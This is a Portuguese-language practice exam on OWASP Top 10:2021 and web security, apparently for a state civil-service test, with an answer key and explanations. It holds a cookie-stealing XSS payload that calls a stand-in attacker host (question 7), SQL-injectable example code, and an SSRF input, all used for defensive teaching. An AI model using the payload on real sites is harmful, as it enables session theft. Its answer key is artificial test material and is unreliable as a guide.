# SIMULADO TEMÁTICO 02 - OWASP Top 10 e Segurança

**Cargo:** Analista de Aplicações de Tecnologia da Informação e Comunicação
**Órgão:** ATI - Governo do Estado de Pernambuco
**Banca:** FCC (Simulado)
**Tópico:** Segurança em Aplicações - OWASP Top 10:2021
**Questões:** 20
**Tempo Sugerido:** 40 minutos (2 min/questão)
**Nível:** Misto (25% Básico, 50% Intermediário, 25% Avançado)

---

## QUESTÕES

### Questão 1 (Básico)

O OWASP Top 10:2021 é um documento que lista

a) as 10 ferramentas de segurança mais utilizadas em aplicações web.

b) os 10 principais riscos de segurança em aplicações web.

c) os 10 melhores frameworks para desenvolvimento seguro.

d) as 10 certificações de segurança mais importantes.

e) os 10 algoritmos de criptografia recomendados.

---

### Questão 2 (Intermediário)

Uma aplicação web permite que usuários autenticados acessem seus dados pela URL `/api/user/123`. Um analista descobriu que ao alterar o ID para `/api/user/124`, consegue acessar dados de outro usuário sem validação adicional. Esta vulnerabilidade é classificada no OWASP Top 10:2021 como

a) A02:2021 - Cryptographic Failures.

b) A01:2021 - Broken Access Control.

c) A03:2021 - Injection.

d) A07:2021 - Identification and Authentication Failures.

e) A05:2021 - Security Misconfiguration.

---

### Questão 3 (Básico)

Qual vulnerabilidade ocupava a posição A01 no OWASP Top 10:2017 e passou para A03 em 2021?

a) Cross-Site Scripting (XSS).

b) Broken Access Control.

c) Injection.

d) Security Misconfiguration.

e) Sensitive Data Exposure.

---

### Questão 4 (Avançado)

Um Analista de Segurança identificou o seguinte código em uma aplicação:

```java
String query = "SELECT * FROM users WHERE username='" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

Para corrigir a vulnerabilidade SQL Injection neste código, deve-se

a) utilizar PreparedStatement com parâmetros vinculados (bind variables).

b) implementar criptografia TLS/SSL na conexão com o banco de dados.

c) adicionar autenticação multifator antes de executar a consulta.

d) validar o tamanho máximo da variável username antes da consulta.

e) configurar firewall de aplicação web (WAF) para bloquear consultas maliciosas.

---

### Questão 5 (Intermediário)

A diferença entre SAST (Static Application Security Testing) e DAST (Dynamic Application Security Testing) é que

a) SAST testa aplicação em execução e DAST analisa código-fonte sem executar.

b) SAST analisa código-fonte sem executar e DAST testa aplicação em execução.

c) SAST é usado em produção e DAST em desenvolvimento.

d) SAST detecta apenas SQL Injection e DAST detecta apenas XSS.

e) não há diferença, sendo ferramentas sinônimas de análise de segurança.

---

### Questão 6 (Intermediário)

Uma aplicação utiliza a biblioteca jQuery versão 1.8.0, que possui vulnerabilidades conhecidas. Esta situação se enquadra em qual categoria do OWASP Top 10:2021?

a) A04:2021 - Insecure Design.

b) A05:2021 - Security Misconfiguration.

c) A06:2021 - Vulnerable and Outdated Components.

d) A08:2021 - Software and Data Integrity Failures.

e) A09:2021 - Security Logging and Monitoring Failures.

---

### Questão 7 (Avançado)

Um atacante envia o seguinte payload em um campo de formulário:

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

Se este código for refletido na página sem sanitização, trata-se de vulnerabilidade

a) SQL Injection, categoria A03:2021.

b) XSS (Cross-Site Scripting), categoria A03:2021.

c) CSRF (Cross-Site Request Forgery), categoria A01:2021.

d) Command Injection, categoria A03:2021.

e) SSRF (Server-Side Request Forgery), categoria A10:2021.

---

### Questão 8 (Básico)

O OAuth 2.0 é um protocolo de

a) criptografia de dados em trânsito e em repouso.

b) autorização que permite acesso delegado a recursos.

c) autenticação multifator para aplicações web.

d) detecção de intrusão em redes corporativas.

e) backup e recuperação de dados sensíveis.

---

### Questão 9 (Intermediário)

Para prevenir ataques CSRF (Cross-Site Request Forgery), uma aplicação deve implementar

a) criptografia de todas as requisições HTTP com certificado SSL.

b) tokens CSRF únicos por sessão e validação no servidor.

c) autenticação básica HTTP em todas as requisições.

d) bloqueio de todas as requisições vindas de origens diferentes.

e) limitação de taxa (rate limiting) de 100 requisições por minuto.

---

### Questão 10 (Avançado)

Uma aplicação permite que usuários façam upload de imagens. Um atacante enviou um arquivo com extensão `.jpg` mas contendo código PHP. O servidor executou o código. As medidas adequadas para prevenir isto incluem, EXCETO:

a) validar o tipo MIME real do arquivo, não apenas a extensão.

b) armazenar uploads fora do webroot ou em storage separado.

c) desabilitar execução de scripts no diretório de upload.

d) renomear arquivos removendo extensão original do usuário.

e) confiar apenas na extensão do arquivo fornecida pelo cliente.

---

### Questão 11 (Intermediário)

O princípio de "Defense in Depth" (Defesa em Profundidade) significa

a) focar recursos em uma única camada de segurança muito robusta.

b) implementar múltiplas camadas independentes de segurança.

c) defender apenas o perímetro da rede com firewall avançado.

d) priorizar segurança física sobre segurança lógica de sistemas.

e) utilizar exclusivamente soluções open source de segurança.

---

### Questão 12 (Básico)

SCA (Software Composition Analysis) é uma prática de DevSecOps que analisa

a) comportamento de usuários para detectar atividades suspeitas.

b) código-fonte da aplicação para encontrar vulnerabilidades.

c) componentes e dependências de terceiros utilizados na aplicação.

d) logs de acesso para identificar tentativas de intrusão.

e) configurações de servidores e infraestrutura de produção.

---

### Questão 13 (Avançado)

Considere a configuração CORS (Cross-Origin Resource Sharing):

```javascript
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Esta configuração é considerada insegura porque

a) permite que qualquer origem acesse recursos com credenciais, expondo dados sensíveis.

b) bloqueia todas as requisições legítimas de origens diferentes.

c) desabilita o uso de cookies em requisições cross-origin.

d) requer certificado SSL para todas as origens permitidas.

e) é incompatível com aplicações que utilizam APIs REST.

---

### Questão 14 (Intermediário)

Uma empresa implementou autenticação, mas permite senhas como "123456" e "password". Além disso, não há limite de tentativas de login. Estas falhas se enquadram em

a) A01:2021 - Broken Access Control.

b) A02:2021 - Cryptographic Failures.

c) A04:2021 - Insecure Design.

d) A07:2021 - Identification and Authentication Failures.

e) A09:2021 - Security Logging and Monitoring Failures.

---

### Questão 15 (Intermediário)

O que diferencia BOLA (Broken Object Level Authorization) de BFLA (Broken Function Level Authorization) em APIs?

a) BOLA valida se usuário pode acessar objeto específico; BFLA valida se pode executar função.

b) BOLA é para APIs REST; BFLA é para APIs SOAP.

c) BOLA valida autenticação; BFLA valida autorização.

d) BOLA aplica-se a dados estruturados; BFLA a dados não estruturados.

e) Não há diferença, são termos sinônimos no OWASP API Security.

---

### Questão 16 (Avançado)

Uma aplicação busca URLs fornecidas por usuários para gerar pré-visualizações. Um atacante enviou `http://localhost/admin` como URL. O servidor acessou recursos internos. Esta é vulnerabilidade

a) A01:2021 - Broken Access Control, evitada com validação de credenciais.

b) A03:2021 - Injection, evitada com prepared statements.

c) A10:2021 - SSRF, evitada com whitelist de domínios e segmentação de rede.

d) A02:2021 - Cryptographic Failures, evitada com criptografia de URLs.

e) A07:2021 - Authentication Failures, evitada com autenticação multifator.

---

### Questão 17 (Básico)

Qual das opções NÃO é uma sanção administrativa prevista na LGPD?

a) Advertência com indicação de prazo para adoção de medidas corretivas.

b) Multa simples de até 2% do faturamento, limitada a R$ 50 milhões por infração.

c) Prisão do responsável legal da empresa por até 2 anos.

d) Publicização da infração após devidamente apurada.

e) Bloqueio ou eliminação dos dados pessoais a que se refere a infração.

---

### Questão 18 (Intermediário)

Rate Limiting é uma técnica para prevenir

a) SQL Injection através de limitação de caracteres em queries.

b) abuso de APIs e ataques de negação de serviço (DoS).

c) Cross-Site Scripting (XSS) em formulários web.

d) vazamento de dados através de criptografia de requisições.

e) ataques Man-in-the-Middle em conexões HTTPS.

---

### Questão 19 (Avançado)

Um sistema armazena senhas utilizando MD5 sem salt. Para melhorar a segurança, o Analista deve migrar para

a) SHA-1 com salt aleatório único por senha.

b) SHA-256 com salt aleatório único por senha.

c) bcrypt ou Argon2 com salt e custo computacional adequado.

d) Base64 encoding com chave simétrica AES.

e) Triple DES com salt fixo compartilhado.

---

### Questão 20 (Intermediário)

O OWASP ASVS (Application Security Verification Standard) define

a) ferramentas obrigatórias para testes de segurança em aplicações.

b) requisitos de segurança em três níveis de verificação.

c) linguagens de programação aprovadas para desenvolvimento seguro.

d) certificações profissionais em segurança de aplicações.

e) frameworks exclusivos para aplicações governamentais.

---

## 📊 GABARITO

| Q | Gabarito | Nível |
|---|----------|-------|
| 1 | B | Básico |
| 2 | B | Inter. |
| 3 | C | Básico |
| 4 | A | Avanç. |
| 5 | B | Inter. |
| 6 | C | Inter. |
| 7 | B | Avanç. |
| 8 | B | Básico |
| 9 | B | Inter. |
| 10 | E | Avanç. |
| 11 | B | Inter. |
| 12 | C | Básico |
| 13 | A | Avanç. |
| 14 | D | Inter. |
| 15 | A | Inter. |
| 16 | C | Avanç. |
| 17 | C | Básico |
| 18 | B | Inter. |
| 19 | C | Avanç. |
| 20 | B | Inter. |

---

## ✅ FOLHA DE RESPOSTAS

```
01. [ ]  06. [ ]  11. [ ]  16. [ ]
02. [ ]  07. [ ]  12. [ ]  17. [ ]
03. [ ]  08. [ ]  13. [ ]  18. [ ]
04. [ ]  09. [ ]  14. [ ]  19. [ ]
05. [ ]  10. [ ]  15. [ ]  20. [ ]
```

**Total de acertos: _____ / 20**
**Percentual: _____%**

---

## 📝 JUSTIFICATIVAS DETALHADAS

### Questão 1 - B
O OWASP Top 10 é um documento de conscientização sobre os 10 principais RISCOS DE SEGURANÇA em aplicações web, não ferramentas (A), frameworks (C), certificações (D) ou algoritmos (E).

### Questão 2 - B
Acessar recursos de outros usuários sem validação adequada é **Broken Access Control** (A01:2021). Não é falha criptográfica (A), injection (C), falha de autenticação (D - usuário está autenticado), ou misconfiguration (E).

### Questão 3 - C
**Injection** era A01 em 2017 e passou para A03 em 2021. Broken Access Control subiu para A01 em 2021.

### Questão 4 - A
**PreparedStatement com bind variables** previne SQL Injection separando dados de comandos. TLS não previne injection (B), MFA não relacionado (C), validar tamanho insuficiente (D), WAF é camada adicional mas não correção do código (E).

### Questão 5 - B
**SAST** = análise estática (código-fonte sem executar). **DAST** = análise dinâmica (aplicação em execução). A alternativa A inverte os conceitos.

### Questão 6 - C
Uso de **componentes vulneráveis e desatualizados** = A06:2021. Não é design inseguro (A), misconfiguration (B), integrity failure (D), ou logging failure (E).

### Questão 7 - B
Payload JavaScript malicioso refletido = **XSS (Cross-Site Scripting)**, categoria A03:2021 - Injection. Não é SQL (A), não é CSRF (C), não é command injection (D), não é SSRF (E).

### Questão 8 - B
OAuth 2.0 é protocolo de **autorização** (acesso delegado). Não é criptografia (A), não é autenticação MFA (C), não é IDS (D), não é backup (E).

### Questão 9 - B
Prevenção CSRF requer **tokens CSRF únicos validados no servidor**. SSL não previne CSRF (A), autenticação básica insuficiente (C), bloquear todas origens diferentes quebra funcionalidade (D), rate limiting não previne CSRF (E).

### Questão 10 - E
**EXCETO E**: Confiar apenas na extensão do cliente é INSEGURO. Todas as outras (A, B, C, D) são medidas adequadas de segurança.

### Questão 11 - B
Defense in Depth = **múltiplas camadas independentes** de segurança. Não é única camada (A), não é só perímetro (C), não é apenas física (D), não é apenas open source (E).

### Questão 12 - C
**SCA** analisa **componentes e dependências de terceiros**. Não analisa comportamento (A), não é SAST para código próprio (B), não analisa logs (D), não analisa configuração de infra (E).

### Questão 13 - A
`Access-Control-Allow-Origin: *` com `Allow-Credentials: true` permite **qualquer origem acessar com credenciais**, expondo dados. Não bloqueia requisições (B), não desabilita cookies (C), não requer SSL (D), é compatível com REST (E).

### Questão 14 - D
Senhas fracas e ausência de limite de tentativas = **A07:2021 - Identification and Authentication Failures**. Não é broken access control (A), não é crypto (B), não é design (C), não é logging (E).

### Questão 15 - A
**BOLA** = autorização em nível de objeto (pode acessar este recurso?). **BFLA** = autorização em nível de função (pode executar esta ação?). Não é REST vs SOAP (B), não é autenticação vs autorização (C), não é estruturado vs não estruturado (D), não são sinônimos (E).

### Questão 16 - C
Servidor acessando recursos internos via URL fornecida pelo usuário = **A10:2021 - SSRF**. Prevenir com whitelist de domínios e segmentação de rede. Não é broken access control (A), não é injection (B), não é crypto (D), não é auth failure (E).

### Questão 17 - C
**EXCETO C**: LGPD NÃO prevê prisão. Prevê advertência (A), multa (B), publicização (D) e bloqueio/eliminação (E).

### Questão 18 - B
**Rate Limiting** previne **abuso de APIs e DoS** (negação de serviço). Não previne SQL injection (A), não previne XSS (C), não é criptografia (D), não previne MITM (E).

### Questão 19 - C
MD5 é quebrado. Migrar para **bcrypt ou Argon2** (funções específicas para hash de senha com salt e custo computacional). SHA-1 também é fraco (A), SHA-256 não é ideal para senhas (B), Base64 não é hash (D), Triple DES não é para senhas (E).

### Questão 20 - B
**OWASP ASVS** define **requisitos de segurança em 3 níveis** (Level 1, 2, 3) de verificação. Não define ferramentas obrigatórias (A), linguagens (C), certificações (D), ou frameworks exclusivos (E).

---

## 📈 ANÁLISE DE DESEMPENHO

- **17-20 acertos (85-100%)**: 🏆 Excelente! Segurança é seu forte
- **14-16 acertos (70-85%)**: ✅ Bom! Revise conceitos específicos
- **10-13 acertos (50-70%)**: ⚠️ Regular. Estude OWASP mais profundamente
- **0-9 acertos (<50%)**: 🔴 Crítico. Priorize este tópico!

---

## 🔄 PRÓXIMOS PASSOS

1. Criar flashcards de cada erro
2. Estudar especificamente os A0X que errou
3. Praticar code review focando nas vulnerabilidades
4. Refazer em 3-5 dias

**Data:** ____/____/2025 | **Acertos:** ___/20 | **%:** ____%
